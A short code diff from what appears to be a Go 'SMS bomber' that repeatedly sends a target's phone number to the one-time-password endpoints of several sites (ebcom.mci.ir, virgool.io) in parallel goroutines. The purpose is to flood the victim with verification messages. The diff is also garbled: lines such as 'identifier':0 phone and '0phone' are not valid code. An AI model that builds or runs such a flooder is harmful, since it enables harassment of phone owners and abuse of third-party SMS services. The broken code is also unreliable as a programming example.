@@ -108,7 +108,6 @@ func main() {
 
 	for i := 0; i < repeatCount; i++ {
 /////////////////////////////////////// site aparat should definitely be added.
-		}, ch)  
 		go sms("https://ebcom.mci.ir/services/auth/v1.0/otp", map[string]interface{}{
 			"msisdn": phone,
 		}, ch)  
@@ -116,7 +115,7 @@ func main() {
 			"username": phone,
 		}, ch)   // add site
 		go sms("https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
-			"identifier": 0phone,
+			"identifier":0 phone,
 		}, ch)   // add site
 		go sms("https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
 			"'method': 'phone', 'identifier'": 0phone,
